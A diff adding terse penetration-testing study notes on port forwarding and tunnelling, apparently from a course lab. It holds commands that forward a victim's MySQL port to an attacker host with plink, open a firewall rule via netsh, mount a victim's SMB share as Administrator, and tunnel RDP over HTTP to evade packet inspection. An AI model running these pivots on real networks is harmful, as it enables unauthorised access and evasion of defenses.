@@ -1,0 +1,58 @@
+------------------
+NOTES
+------------------
+
+Port Forwarding
+	rinetd
+		redirect traffic
+		sudo apt update && sudo apt install rinetd
+		edit the config file
+			ex. cat /etc/rinetd.conf
+					# bindadress    bindport  connectaddress  connectport
+						0.0.0.0 80 216.58.207.142 80
+					sudo service rinetd restart
+
+SSH Tunneling
+	been known bout this
+
+PLINK.exe
+	Windows tool for Forwarding
+	plink.exe
+	  -D [listen-IP:]listen-port
+            Dynamic SOCKS-based port forwarding
+		-L [listen-IP:]listen-port:host:port
+							Forward local port to remote address
+		-R [listen-IP:]listen-port:host:port
+							Forward remote port to local address
+
+	plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+		-ssh = connect via ssh
+		-l = username
+		-pw = password
+		-R = remote port forward, send all traffic from 10.11.0.4 port 1234 to localhost port 3306
+			if a packet is sent to 10.11.0.4 port 1234, it is forwarded to localhost 3306
+				example, hacking from 10.11.0.4, find a hidden mysql db, forward traffic from attacker to victim
+
+	cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+		get around the "store key in cache" question
+
+NETSH
+	need IP Helper service to run and IPv6 support
+		check in the windows services settings
+	netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
+		you can figure this one out
+	netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
+
+	Need smbv2 configured on unix attacker
+		cat /etc/samba/smb.conf | grep protocol
+
+	sudo mkdir /mnt/win10_share
+	sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share
+	ls -l /mnt/win10_share/
+
+HTTPTunneling through deep packet inspection
+	deep packet inspection may disallow certain protocols (ssh)
+
+	sudo apt install httptunnel
+	ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
+	hts --forward-port localhost:8888 1234
